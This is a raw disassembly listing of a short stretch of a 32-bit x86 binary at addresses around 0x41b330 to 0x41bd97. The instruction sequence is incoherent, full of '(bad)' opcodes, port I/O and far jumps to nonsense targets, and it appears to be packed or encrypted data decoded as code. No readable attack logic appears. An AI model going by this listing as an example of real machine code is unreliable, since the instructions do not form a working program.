  41b32a:	bound  esp,QWORD PTR [esi-0x30b53dc5]
  41b330:	dec    eax
  41b331:	cmp    ebp,DWORD PTR [edi*4+0x4998a0d7]
  41b338:	push   edi
  41b339:	xchg   ecx,eax
  41b33a:	arpl   WORD PTR [edi+0x511a5cee],sp
  41b340:	push   ebp
  41b341:	cmp    ebp,DWORD PTR [esi-0x42]
  41b344:	shl    DWORD PTR [eax],cl
  41b346:	jne    0x41b304
  41b348:	dec    edi
  41b349:	and    edx,DWORD PTR [eax+0x2f8cb1c]
  41b34f:	jge    0x41b2e0
  41b351:	push   0x3d
  41b353:	sbb    eax,0x4f9506d3
  41b358:	and    BYTE PTR [ecx],bl
  41b35a:	add    ebp,DWORD PTR [eax]
  41b35c:	scas   al,BYTE PTR es:[edi]
  41b35d:	jl     0x41b351
  41b35f:	cmc    
  41b360:	aad    0x5a
  41b362:	out    dx,al
  41b363:	xlat   BYTE PTR ds:[ebx]
  41b364:	xor    DWORD PTR [ebx],esi
  41b366:	push   esp
  41b367:	and    ah,BYTE PTR [eax+0x65]
  41b36a:	sbb    esp,ebx
  41b36c:	mov    cl,0x12
  41b36e:	inc    ebx
  41b36f:	inc    edx
  41b370:	in     eax,0x9a
  41b372:	repz je 0x41b381
  41b375:	mov    ds:0xefd99079,eax
  41b37a:	push   es
  41b37b:	pushf  
  41b37c:	call   0x5f62bd85
  41b381:	add    al,0xf8
  41b383:	xchg   edi,eax
  41b384:	push   0xffffff9f
  41b386:	ds dec edx
  41b388:	ds sbb al,bl
  41b38b:	sub    DWORD PTR [edi+0x5a],0x2d
  41b38f:	mov    dl,0xd7
  41b391:	lods   al,BYTE PTR ds:[esi]
  41b392:	mov    bl,0x9e
  41b394:	jle    0x41b342
  41b396:	sub    DWORD PTR [esi+0x3aa63538],ebp
  41b39c:	sar    BYTE PTR [ecx-0x14],cl
  41b39f:	test   eax,ebx
  41b3a1:	jp     0x41b334
  41b3a3:	outs   dx,DWORD PTR ds:[esi]
  41b3a4:	jl     0x41b35e
  41b3a6:	inc    edx
  41b3a7:	fmul   QWORD PTR [esi+ebx*8-0x7f657f68]
  41b3ae:	xchg   ecx,eax
  41b3af:	adc    DWORD PTR [eax-0x471247b0],edx
  41b3b5:	mov    eax,ds:0x70256862
  41b3ba:	test   al,0x48
  41b3bc:	sbb    ah,dh
  41b3be:	or     ebp,DWORD PTR [esi+0x1d]
	...
  41b431:	add    BYTE PTR [eax],al
  41b433:	add    BYTE PTR [edi-0xf0307e],bh
  41b439:	dec    edi
  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	int    0x1e
  41b442:	stos   DWORD PTR es:[edi],eax
  41b443:	in     al,dx
  41b444:	mov    al,ds:0xf5000126
  41b449:	add    BYTE PTR [eax],al
  41b44b:	add    BYTE PTR [ecx-0x20],dh
  41b44e:	mov    ebp,0x3cfc0867
  41b453:	shl    DWORD PTR [ecx-0xf],1
  41b456:	rcl    DWORD PTR [edi-0x9],cl
  41b459:	jl     0x41b45a
  41b45b:	test   BYTE PTR [ecx-0x665234c],dl
  41b461:	mov    edx,0x95f5a7f3
  41b466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b467:	test   eax,0x95b546de
  41b46c:	push   ds
  41b46d:	sub    al,0xe5
  41b46f:	xchg   ebp,eax
  41b470:	xchg   ebp,eax
  41b471:	or     al,0x84
  41b473:	add    BYTE PTR [ecx+ebx*8+0x2100501b],bh
  41b47a:	cmp    DWORD PTR [ebx+0x3d],eax
  41b47d:	inc    eax
  41b47e:	pop    edx
  41b47f:	or     al,0x56
  41b481:	push   0xc8ab18dd
  41b486:	jle    0x41b44d
  41b488:	dec    edx
  41b489:	push   edi
  41b48a:	jno    0x41b426
  41b48c:	dec    ebx
  41b48d:	pop    ds
  41b48e:	sahf   
  41b48f:	jmp    0x1e6a333
  41b494:	add    ebx,DWORD PTR [edi+edx*8]
  41b497:	std    
  41b498:	pop    esi
  41b499:	pop    ss
  41b49a:	xor    eax,0x29687839
  41b49f:	push   cs
  41b4a0:	xchg   ebx,eax
  41b4a1:	(bad)  
  41b4a2:	mov    bh,0x39
  41b4a4:	shr    BYTE PTR ds:0xabf4aac3,0x45
  41b4ab:	imul   edx,DWORD PTR [ebp-0x71f8a53e],0x88c6225b
  41b4b5:	sbb    ecx,DWORD PTR [eax]
  41b4b7:	sti    
  41b4b8:	outs   dx,BYTE PTR ds:[esi]
  41b4b9:	cmp    ah,dh
  41b4bb:	clc    
  41b4bc:	dec    esp
  41b4bd:	cld    
  41b4be:	xchg   esp,eax
  41b4bf:	pop    sp
  41b4c1:	jno    0x41b518
  41b4c3:	retf   0x21ba
  41b4c6:	mov    cl,BYTE PTR ds:0x1267471e
  41b4cc:	jne    0x41b497
  41b4ce:	jmp    0x37cbf4c0
  41b4d3:	icebp  
  41b4d4:	xor    ebx,DWORD PTR [ecx]
  41b4d6:	mov    ss,esp
  41b4d8:	shl    BYTE PTR [ebp-0x35],cl
  41b4db:	mov    WORD PTR [esi-0x4f],?
  41b4de:	add    eax,0x4e6248fa
  41b4e3:	fstp   DWORD PTR [ecx-0x4e]
  41b4e6:	cmp    esp,DWORD PTR [edi]
  41b4e8:	test   eax,0xa624bb77
  41b4ed:	push   ds
  41b4ee:	loopne 0x41b564
  41b4f0:	jae    0x41b50f
  41b4f2:	pshufw mm6,mm2,0xf5
  41b4f6:	ins    DWORD PTR es:[edi],dx
  41b4f7:	push   ebp
  41b4f8:	xor    eax,0xb8d523ee
  41b4fd:	inc    ebp
  41b4fe:	(bad)  
  41b4ff:	mov    esi,0x9a92bf86
  41b504:	add    ebx,DWORD PTR [edx+0x3de0f860]
  41b50a:	mov    ebp,0xafd86239
  41b50f:	push   ebx
  41b510:	mov    ah,0x14
  41b512:	push   0x403f320d
  41b517:	push   eax
  41b518:	mov    eax,DWORD PTR [ecx+0x616c864c]
  41b51e:	int3   
  41b51f:	test   al,0x2b
  41b521:	addr16 and al,0x31
  41b524:	and    BYTE PTR [ecx+edx*4-0x3a],ah
  41b528:	fs pop ds
  41b52a:	jb     0x41b4f2
  41b52c:	nop
  41b52d:	retf   0xcbfc
  41b530:	pop    esi
  41b531:	out    dx,al
  41b532:	fdivr  DWORD PTR [ecx-0x7d8e6a4d]
  41b538:	(bad)  
  41b539:	mov    al,0x94
  41b53b:	jle    0x41b566
  41b53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b53e:	or     BYTE PTR [edi+0x36],ch
	...
  41b5b1:	add    BYTE PTR [eax],al
  41b5b3:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0x19
  41b5c1:	lods   eax,DWORD PTR ds:[esi]
  41b5c2:	jl     0x41b5cc
  41b5c4:	xchg   ebp,eax
  41b5c5:	daa    
  41b5c6:	add    DWORD PTR [eax],eax
  41b5c8:	cmc    
  41b5c9:	add    BYTE PTR [eax],al
  41b5cb:	add    BYTE PTR [edx+edi*8],bh
  41b5ce:	icebp  
  41b5cf:	sub    al,0xd6
  41b5d1:	sub    edi,ecx
  41b5d3:	clc    
  41b5d4:	sub    bh,dh
  41b5d6:	iret   
  41b5d7:	xchg   bl,al
  41b5d9:	into   
  41b5da:	scas   eax,DWORD PTR es:[edi]
  41b5db:	cdq    
  41b5dc:	mov    ah,0x9a
  41b5de:	ret    
  41b5df:	stos   DWORD PTR es:[edi],eax
  41b5e0:	rcl    ch,0xb0
  41b5e3:	addr16 add edx,ebx
  41b5e6:	mov    ds:0x72dfb1f,al
  41b5eb:	retf   0xa6a1
  41b5ee:	int    0x41
  41b5f0:	lods   al,BYTE PTR ds:[esi]
  41b5f1:	test   BYTE PTR [esi+0x1798f743],ah
  41b5f7:	mov    eax,0xed86cc0b
  41b5fc:	sahf   
  41b5fd:	rol    BYTE PTR [edi+0x688b6d0b],0xe1
  41b604:	out    dx,eax
  41b605:	adc    cl,dh
  41b607:	cmp    dh,bl
  41b609:	pop    ds
  41b60a:	sbb    DWORD PTR [esp+ebx*8-0x67],0xe91f23d2
  41b612:	aas    
  41b613:	jl     0x41b600
  41b615:	sbb    DWORD PTR [ebp-0x59],ebx
  41b618:	xchg   DWORD PTR [ebp-0x10],ecx
  41b61b:	dec    ebp
  41b61c:	(bad)  
  41b61d:	mov    ah,0x3a
  41b61f:	xchg   esi,eax
  41b620:	pop    eax
  41b621:	push   esp
  41b622:	stc    
  41b623:	mov    cl,0xa5
  41b625:	clc    
  41b626:	push   0xffffffdc
  41b628:	jmp    0x41b695
  41b62a:	dec    ecx
  41b62b:	push   ebp
  41b62c:	jge    0x41b63c
  41b62e:	mov    cl,0xd
  41b630:	pop    ecx
  41b631:	dec    BYTE PTR [eax-0x144e17]
  41b637:	jecxz  0x41b5bd
  41b639:	lds    edi,FWORD PTR [edi+0x71260d53]
  41b63f:	and    edi,DWORD PTR [edx]
  41b641:	dec    ecx
  41b642:	outs   dx,DWORD PTR ds:[esi]
  41b643:	cld    
  41b644:	mov    cl,0xe6
  41b646:	mov    edx,ecx
  41b648:	aam    0xcf
  41b64a:	inc    edx
  41b64b:	jno    0x41b6bb
  41b64d:	pop    ecx
  41b64e:	push   eax
  41b64f:	mov    ecx,0x86c48f39
  41b654:	push   esp
  41b655:	dec    esi
  41b656:	mov    es,WORD PTR [ecx+0x721cb60c]
  41b65c:	jae    0x41b67d
  41b65e:	jp     0x41b6c1
  41b660:	hlt    
  41b661:	add    edi,ebp
  41b663:	adc    dl,BYTE PTR [edi+esi*8]
  41b666:	sub    bl,BYTE PTR [esi-0x33]
  41b669:	sbb    ah,BYTE PTR [ecx+esi*1]
  41b66c:	popa   
  41b66d:	repnz sbb al,0xb
  41b670:	pushf  
  41b671:	cmp    ebx,esp
  41b673:	retf   0xdacb
  41b676:	test   eax,0x72411942
  41b67b:	jae    0x41b69d
  41b67d:	and    ebp,esp
  41b67f:	mov    esi,0x17e79688
  41b684:	xchg   esi,eax
  41b685:	cmp    BYTE PTR ds:0x44ea1396,cl
  41b68b:	loopne 0x41b671
  41b68d:	fs xchg edx,eax
  41b68f:	sub    ch,BYTE PTR [edx+0x0]
  41b692:	outs   dx,BYTE PTR ds:[esi]
  41b693:	psubusw mm4,QWORD PTR [ebp-0x1b]
  41b697:	mov    eax,ds:0x5dbbf185
  41b69c:	hlt    
  41b69d:	stos   DWORD PTR es:[edi],eax
  41b69e:	pop    ecx
  41b69f:	xchg   edx,eax
  41b6a0:	jg     0x41b71c
  41b6a2:	cmp    eax,0xfdbc76af
  41b6a7:	ins    BYTE PTR es:[edi],dx
  41b6a8:	jl     0x41b696
  41b6aa:	or     al,0xda
  41b6ac:	pusha  
  41b6ad:	dec    ebp
  41b6ae:	xor    ebp,DWORD PTR ds:0x4eed599e
  41b6b4:	push   edi
  41b6b5:	xor    DWORD PTR [edi-0x3eed2cc7],0x2381fb66
  41b6bf:	in     eax,0x6c
	...
  41b731:	add    BYTE PTR [eax],al
  41b733:	add    bl,dh
  41b735:	xchg   edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    BYTE PTR [esi],dh
  41b741:	cs test eax,0x1288ae7
  41b747:	add    ch,dh
  41b749:	add    BYTE PTR [eax],al
  41b74b:	add    BYTE PTR [edi-0x58e8fb45],dh
  41b751:	rcl    BYTE PTR [esi+0x1b5f146e],1
  41b757:	dec    edi
  41b758:	mov    DWORD PTR ds:0xb8f6907e,edi
  41b75e:	dec    ebp
  41b75f:	(bad)  
  41b760:	cmp    DWORD PTR [ebx+0x7b],esi
  41b763:	sub    esi,esp
  41b765:	mov    ds:0x8392690b,al
  41b76a:	push   edi
  41b76b:	dec    edx
  41b76c:	mov    esp,0x90eedb4e
  41b771:	push   esp
  41b772:	in     eax,dx
  41b773:	stc    
  41b774:	(bad)
  41b777:	adc    BYTE PTR [ecx-0x42],dl
  41b77a:	add    BYTE PTR [edi-0x7d],bh
  41b77d:	dec    ebx
  41b77e:	mov    ah,0xbf
  41b780:	xor    BYTE PTR [edx-0x6e],bl
  41b783:	mov    dh,0x5c
  41b785:	enter  0xa5d6,0x9f
  41b789:	sbb    BYTE PTR [ebp-0x4a],bh
  41b78c:	and    al,0xbd
  41b78e:	mov    esi,DWORD PTR [ebx]
  41b790:	(bad)  
  41b791:	out    0x0,al
  41b793:	retf   
  41b794:	fsub   QWORD PTR [esi+0x1f]
  41b797:	mov    esp,0x456fffd1
  41b79c:	test   eax,0xad1ffd75
  41b7a1:	sub    al,0x77
  41b7a3:	jmp    0x8f3a:0xaf64a5a7
  41b7aa:	push   edi
  41b7ab:	hlt    
  41b7ac:	ret    
  41b7ad:	(bad)  
  41b7ae:	jp     0x41b7b2
  41b7b0:	add    ecx,esi
  41b7b2:	or     eax,0x79898a45
  41b7b7:	out    dx,eax
  41b7b8:	stc    
  41b7b9:	and    ebx,esi
  41b7bb:	xchg   ebp,eax
  41b7bc:	add    eax,DWORD PTR [edi+0x1d70dd82]
  41b7c2:	cs mov ah,0x77
  41b7c5:	xor    al,0x9
  41b7c7:	push   0xe6366ffc
  41b7cc:	mov    al,0x6e
  41b7ce:	and    eax,0x4e7c8eef
  41b7d3:	ins    BYTE PTR es:[edi],dx
  41b7d4:	fistp  QWORD PTR [ecx-0x8]
  41b7d7:	mov    esp,edx
  41b7d9:	jle    0x41b7e2
  41b7db:	fisttp DWORD PTR [edi-0x70]
  41b7de:	push   edx
  41b7df:	xchg   esi,eax
  41b7e0:	mov    ds:0x11dfdd85,eax
  41b7e5:	jno    0x41b843
  41b7e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7e8:	mov    cl,0x75
  41b7ea:	or     BYTE PTR [esi+0x15],bh
  41b7ed:	(bad)  
  41b7ee:	(bad)  
  41b7ef:	push   ds
  41b7f0:	mov    ds:0xcb176fb1,al
  41b7f5:	mov    ebx,0xd64d45e2
  41b7fa:	lods   eax,DWORD PTR ds:[esi]
  41b7fb:	jne    0x41b834
  41b7fd:	pop    edi
  41b7fe:	mov    es,eax
  41b800:	xchg   edi,eax
  41b801:	mov    bl,0x2b
  41b803:	mov    bh,0x30
  41b805:	sahf   
  41b806:	enter  0xc15,0xee
  41b80a:	pop    es
  41b80b:	inc    edi
  41b80c:	test   eax,0x37139ea7
  41b811:	sbb    al,0xaf
  41b813:	lock sbb al,0x37
  41b816:	and    al,0x14
  41b818:	out    dx,al
  41b819:	pop    ss
  41b81a:	not    DWORD PTR [esi]
  41b81c:	adc    BYTE PTR [edi],al
  41b81e:	aas    
  41b81f:	loope  0x41b828
  41b821:	xor    DWORD PTR [ecx+esi*4-0x54b2d96],ebp
  41b828:	cli    
  41b829:	mov    eax,ds:0x22fdb28e
  41b82e:	mov    cl,0xa2
  41b830:	mov    bl,0x54
  41b832:	iret   
  41b833:	nop
  41b834:	and    BYTE PTR [ecx+0x2a97ada5],bh
  41b83a:	fcmovu st,st(5)
  41b83c:	not    BYTE PTR [edi]
  41b83e:	out    0x62,al
  41b840:	test   al,0x0
	...
  41b8b2:	add    BYTE PTR [eax],al
  41b8b4:	xor    eax,0xcf4a867e
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	dec    ebx
  41b8c1:	jmp    0x1:0x297f39c8
  41b8c8:	cmc    
  41b8c9:	add    BYTE PTR [eax],al
  41b8cb:	add    dh,cl
  41b8cd:	push   ds
  41b8ce:	jle    0x41b929
  41b8d0:	std    
  41b8d1:	inc    eax
  41b8d2:	jge    0x41b8ee
  41b8d4:	mov    ecx,0x21efebd0
  41b8d9:	into   
  41b8da:	mov    al,0xaa
  41b8dc:	add    eax,0x2fe26f15
  41b8e1:	mov    ch,0xaa
  41b8e3:	push   esp
  41b8e4:	gs ret 
  41b8e6:	mov    bl,0x80
  41b8e8:	(bad)  
  41b8e9:	lock xor edx,DWORD PTR [edx-0x56e7cb20]
  41b8f0:	and    ah,BYTE PTR [ecx-0x73155c80]
  41b8f6:	out    0x48,al
  41b8f8:	inc    ecx
  41b8f9:	dec    edi
  41b8fa:	jno    0x41b8ed
  41b8fc:	and    ah,dl
  41b8fe:	pop    ds
  41b8ff:	enter  0x3d18,0xe1
  41b903:	popf   
  41b904:	and    al,0x8e
  41b906:	push   ebx
  41b907:	aad    0xdd
  41b909:	dec    eax
  41b90a:	test   al,0x4
  41b90c:	adc    al,0xf5
  41b90e:	into   
  41b90f:	daa    
  41b910:	sbb    esi,DWORD PTR [ebp-0x2a]
  41b913:	add    al,0x65
  41b915:	test   al,0x50
  41b917:	popf   
  41b918:	(bad)  
  41b919:	or     ebx,esi
  41b91b:	(bad)  
  41b91c:	and    al,bl
  41b91e:	scas   eax,DWORD PTR es:[edi]
  41b91f:	(bad)  
  41b920:	hlt    
  41b921:	dec    edi
  41b922:	outs   dx,DWORD PTR ds:[esi]
  41b923:	add    ebx,DWORD PTR [edi+0x4f0a5d9f]
  41b929:	rcr    cl,cl
  41b92b:	adc    DWORD PTR [edi-0x77],ebp
  41b92e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b92f:	or     ch,BYTE PTR [esi+0xdbfc170]
  41b935:	push   edx
  41b936:	sub    DWORD PTR [ebx+ebp*2+0x46dca136],0xffffffdf
  41b93e:	sub    BYTE PTR [ebx+0x4bacb5d1],dl
  41b944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b945:	(bad)  
  41b946:	mov    ds:0x4ac84a5d,al
  41b94b:	outs   dx,DWORD PTR ds:[esi]
  41b94c:	xor    al,0xe8
  41b94e:	imul   edx,ecx,0xf502b1e7
  41b954:	jp     0x41b9d3
  41b956:	adc    ch,BYTE PTR [ebp-0x3e9ccf56]
  41b95c:	fisubr DWORD PTR [ebx-0x7f]
  41b95f:	(bad)  
  41b960:	or     DWORD PTR [esi+edi*1],0xffffffb6
  41b964:	stos   BYTE PTR es:[edi],al
  41b965:	dec    ecx
  41b966:	bound  ebx,QWORD PTR [ecx-0x1450cc3e]
  41b96c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b96d:	test   ch,dl
  41b96f:	jecxz  0x41b993
  41b971:	mov    esi,0x583dc4b1
  41b976:	call   0x8edb:0xae4f7735
  41b97d:	in     eax,dx
  41b97e:	xchg   edx,eax
  41b97f:	std    
  41b980:	mov    edx,DWORD PTR ds:0x1ed81b80
  41b986:	mov    dl,0x19
  41b988:	lods   al,BYTE PTR ds:[esi]
  41b989:	sub    eax,0xffce3579
  41b98e:	push   ds
  41b98f:	in     al,dx
  41b990:	pop    esp
  41b991:	enter  0x8058,0xb0
  41b995:	(bad)  
  41b996:	push   ebp
  41b997:	jo     0x41b9c4
  41b999:	dec    edx
  41b99a:	fstp   DWORD PTR [eax+edx*4-0x41]
  41b99e:	mov    al,0xdb
  41b9a0:	sbb    eax,0xeae5ca34
  41b9a5:	cli    
  41b9a6:	je     0x41ba02
  41b9a8:	out    0x95,eax
  41b9aa:	ins    DWORD PTR es:[edi],dx
  41b9ab:	aaa    
  41b9ac:	xor    ch,0x12
  41b9af:	adc    cl,al
  41b9b1:	dec    ecx
  41b9b2:	in     eax,dx
  41b9b3:	or     DWORD PTR [edi],ecx
  41b9b5:	mov    edi,0x880f323a
  41b9ba:	(bad)  
  41b9bb:	in     al,0x16
  41b9bd:	fist   DWORD PTR [edx]
  41b9bf:	aaa    
  41b9c0:	xlat   BYTE PTR ds:[ebx]
	...
  41ba31:	add    BYTE PTR [eax],al
  41ba33:	add    bh,dh
  41ba35:	add    esp,ebx
  41ba37:	mov    ah,0xfe
  41ba39:	std    
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	push   0xffffffbd
  41ba42:	mov    ds:0x12a748f,al
  41ba47:	add    ch,dh
  41ba49:	add    BYTE PTR [eax],al
  41ba4b:	add    bh,bh
  41ba4d:	cs inc ebp
  41ba4f:	std    
  41ba50:	lock into 
  41ba52:	mov    esi,0x2e10f6ee
  41ba57:	jmp    0x9972:0x7a8038c6
  41ba5e:	mov    ebp,DWORD PTR [esi-0x61]
  41ba61:	mov    al,BYTE PTR [edx+0x45]
  41ba64:	or     al,0x16
  41ba66:	cmp    BYTE PTR [ecx+0x17],dl
  41ba69:	cmp    DWORD PTR [esi+0x3b],edi
  41ba6c:	cmp    eax,0x739dab26
  41ba71:	push   esi
  41ba72:	daa    
  41ba73:	inc    ebx
  41ba74:	inc    ebx
  41ba75:	pop    edi
  41ba76:	int3   
  41ba77:	out    dx,eax
  41ba78:	mov    ebx,DWORD PTR [esi-0x35]
  41ba7b:	add    DWORD PTR [ebp+0x551f3d7d],0xfffffffe
  41ba82:	add    al,0xba
  41ba84:	dec    ebx
  41ba85:	mov    al,0x52
  41ba87:	sbb    DWORD PTR [ebx-0x2dd350be],ecx
  41ba8d:	fs push edi
  41ba8f:	inc    esp
  41ba90:	cmp    DWORD PTR [ecx-0x5b],esi
  41ba93:	leave  
  41ba94:	dec    ecx
  41ba95:	pop    esp
  41ba96:	(bad)  
  41ba97:	jns    0x41bae6
  41ba99:	pop    edx
  41ba9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba9b:	and    BYTE PTR [ecx+0x6],ch
  41ba9e:	sbb    al,BYTE PTR [edi+0x5c]
  41baa1:	xor    al,0xdc
  41baa3:	mov    ecx,0x248214ea
  41baa8:	fs xor al,dl
  41baab:	add    DWORD PTR [esi],ecx
  41baad:	adc    eax,0x48b74978
  41bab2:	sar    al,1
  41bab4:	and    DWORD PTR [edi-0x40],esp
  41bab7:	jo     0x41ba89
  41bab9:	nop
  41baba:	mov    ah,0x4b
  41babc:	ror    BYTE PTR [esi],cl
  41babe:	popf   
  41babf:	(bad)  
  41bac0:	mov    eax,0x2fa33953
  41bac5:	rol    DWORD PTR [edx-0x353fa707],0x8b
  41bacc:	stos   BYTE PTR es:[edi],al
  41bacd:	add    eax,0x2d7baf67
  41bad2:	sbb    eax,0x597cf0b9
  41bad7:	and    al,0xc8
  41bad9:	in     al,dx
  41bada:	aas    
  41badb:	ds ja  0x41bac5
  41bade:	sub    eax,0x5c17eaf5
  41bae3:	xor    DWORD PTR [edx+0x65],esp
  41bae6:	push   edi
  41bae7:	jae    0x41ba73
  41bae9:	adc    eax,0xc53ff904
  41baee:	pop    edx
  41baef:	adc    BYTE PTR [ebp-0x5ca5c6b3],ch
  41baf5:	dec    ebp
  41baf6:	dec    edx
  41baf7:	and    eax,DWORD PTR [ecx+0x7f]
  41bafa:	mov    al,0x7e
  41bafc:	cmc    
  41bafd:	mov    ebp,0xf2149070
  41bb02:	cmp    eax,0x899280b6
  41bb07:	and    al,0x9f
  41bb09:	sbb    al,BYTE PTR [ebx-0xc62e7e2]
  41bb0f:	jge    0x41bab5
  41bb11:	mov    ?,WORD PTR [ecx]
  41bb13:	jo     0x41bb42
  41bb15:	mov    BYTE PTR [edx-0x7e8ee86e],cl
  41bb1b:	xchg   esp,eax
  41bb1c:	daa    
  41bb1d:	pop    esi
  41bb1e:	ins    DWORD PTR es:[edi],dx
  41bb1f:	jge    0x41babb
  41bb21:	push   edi
  41bb22:	jns    0x41bb2d
  41bb24:	stc    
  41bb25:	sti    
  41bb26:	or     dl,BYTE PTR [edx+0x51c1fcc9]
  41bb2c:	xchg   esp,ecx
  41bb2e:	or     eax,0x39b792d
  41bb33:	jb     0x41bb3a
  41bb35:	mov    esp,0x40902e41
  41bb3a:	xchg   edi,eax
  41bb3b:	xor    al,0x4c
  41bb3d:	rcr    DWORD PTR [esp+eiz*4+0xa],1
	...
  41bbb1:	add    BYTE PTR [eax],al
  41bbb3:	add    BYTE PTR [edx+0x49],ch
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	into   
  41bbc1:	adc    eax,0x2b69f0dd
  41bbc6:	add    DWORD PTR [eax],eax
  41bbc8:	cmc    
  41bbc9:	add    BYTE PTR [eax],al
  41bbcb:	add    BYTE PTR [edi+0x38],dl
  41bbce:	jns    0x41bb5f
  41bbd0:	mov    al,BYTE PTR [ebx-0x20]
  41bbd3:	fmulp  st(2),st
  41bbd5:	popa   
  41bbd6:	inc    esp
  41bbd7:	mov    al,ds:0x41e70edf
  41bbdc:	push   0x32c6a4bc
  41bbe1:	or     BYTE PTR [esi],0xdb
  41bbe4:	pusha  
  41bbe5:	sahf   
  41bbe6:	jl     0x41bb7d
  41bbe8:	(bad)  
  41bbe9:	mov    WORD PTR [edi-0x30cc3f95],ds
  41bbef:	sbb    bl,BYTE PTR [ecx+edx*2]
  41bbf2:	add    BYTE PTR [esi+ebx*4],bh
  41bbf5:	push   eax
  41bbf6:	popa   
  41bbf7:	pop    ds
  41bbf8:	bound  esi,QWORD PTR [esi+0x15268a3e]
  41bbfe:	xchg   esp,eax
  41bbff:	adc    al,0xb0
  41bc01:	nop
  41bc02:	push   esp
  41bc03:	jns    0x41bb94
  41bc05:	mov    ah,0x55
  41bc07:	add    eax,0x410f426
  41bc0c:	pop    edx
  41bc0d:	stos   DWORD PTR es:[edi],eax
  41bc0e:	xor    ah,BYTE PTR [esi]
  41bc10:	pop    ecx
  41bc11:	stc    
  41bc12:	in     eax,dx
  41bc13:	xor    al,0xd2
  41bc15:	add    ebp,edx
  41bc17:	vpmulhuw xmm5,xmm0,XMMWORD PTR [edx-0x76]
  41bc1c:	adc    eax,0x14bce8da
  41bc21:	aam    0x77
  41bc23:	call   0x5e4ea5c9
  41bc28:	int3   
  41bc29:	addr16 ret 
  41bc2b:	enter  0xf4a5,0x9
  41bc2f:	sar    ebp,0xdd
  41bc32:	xchg   DWORD PTR [edi],esi
  41bc34:	es pushf 
  41bc36:	add    eax,0x9bfcaffc
  41bc3b:	inc    esp
  41bc3c:	out    0x45,al
  41bc3e:	xor    bl,ch
  41bc40:	and    al,0xcd
  41bc42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc43:	fs jmp 0x41bca1
  41bc46:	popa   
  41bc47:	lods   eax,DWORD PTR ds:[esi]
  41bc48:	adc    al,0xb5
  41bc4a:	push   esi
  41bc4b:	xor    BYTE PTR [ebx-0x6b],dl
  41bc4e:	push   ds
  41bc4f:	aam    0x82
  41bc51:	push   edx
  41bc52:	or     ebp,DWORD PTR [edi+eax*2-0x43]
  41bc56:	cld    
  41bc57:	(bad)  
  41bc59:	cmp    bh,BYTE PTR [ecx+0x36]
  41bc5c:	mov    esi,0x7a26ce84
  41bc61:	data16 ds jl 0x41bc6f
  41bc65:	mov    ah,0xbd
  41bc67:	xor    ebx,DWORD PTR [ecx+0x7f]
  41bc6a:	sar    BYTE PTR [ecx],0x15
  41bc6d:	clc    
  41bc6e:	mov    edx,0x4d1af76f
  41bc73:	je     0x41bc66
  41bc75:	sbb    eax,0xf2f90f22
  41bc7a:	add    edi,DWORD PTR [ebx+ebp*1]
  41bc7d:	(bad)  
  41bc7e:	into   
  41bc7f:	call   0x36f3:0xcdd0ba2
  41bc86:	leave  
  41bc87:	in     eax,dx
  41bc88:	scas   al,BYTE PTR es:[edi]
  41bc89:	call   0xb172516d
  41bc8e:	scas   al,BYTE PTR es:[edi]
  41bc8f:	lods   eax,DWORD PTR ds:[esi]
  41bc90:	adc    eax,edi
  41bc92:	jnp    0x41bcd5
  41bc94:	mov    BYTE PTR [edx-0x5a],0xe4
  41bc98:	mov    esi,0x2bad5cf9
  41bc9d:	popf   
  41bc9e:	jmp    0x2de8:0x58a64786
  41bca5:	xor    al,0xc3
  41bca7:	daa    
  41bca8:	fwait
  41bca9:	push   ss
  41bcaa:	or     eax,0x5f1929aa
  41bcaf:	neg    esi
  41bcb1:	mov    edi,0xafaa292c
  41bcb6:	or     eax,0xda26f3ee
  41bcbb:	fist   WORD PTR [ebx-0x3ca2e072]
	...
  41bd31:	add    BYTE PTR [eax],al
  41bd33:	add    BYTE PTR [ebp-0x8],dl
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0xbfbf1c9a
  41bd41:	pop    ss
  41bd42:	and    eax,0x12c5e31
  41bd47:	add    ch,dh
  41bd49:	add    BYTE PTR [eax],al
  41bd4b:	add    ch,bh
  41bd4d:	or     ebp,ecx
  41bd4f:	ret    0x50d4
  41bd52:	dec    edx
  41bd53:	sbb    eax,0xeca23197
  41bd58:	sahf   
  41bd59:	lea    eax,[esi+0x85f1bd0]
  41bd5f:	add    edi,DWORD PTR [edx]
  41bd61:	mov    dh,0x2f
  41bd63:	(bad)  
  41bd64:	sar    DWORD PTR [edi-0x4e6a3d88],1
  41bd6a:	mov    eax,0xacea2745
  41bd6f:	jl     0x41bcf7
  41bd71:	loop   0x41bdd8
  41bd73:	inc    eax
  41bd74:	fistp  QWORD PTR [ebx+0x4ca72c4]
  41bd7a:	inc    esp
  41bd7b:	fs pushf 
  41bd7d:	aas    
  41bd7e:	pop    ds
  41bd7f:	sbb    BYTE PTR [ebp-0x10e272c5],ch
  41bd85:	popf   
  41bd86:	adc    ecx,DWORD PTR [eax-0x2c76f52e]
  41bd8c:	out    0xde,al
  41bd8e:	push   ebp
  41bd8f:	jno    0x41bd27
  41bd91:	and    BYTE PTR [ebx+0x59580e25],bh
  41bd97:	dec    ecx
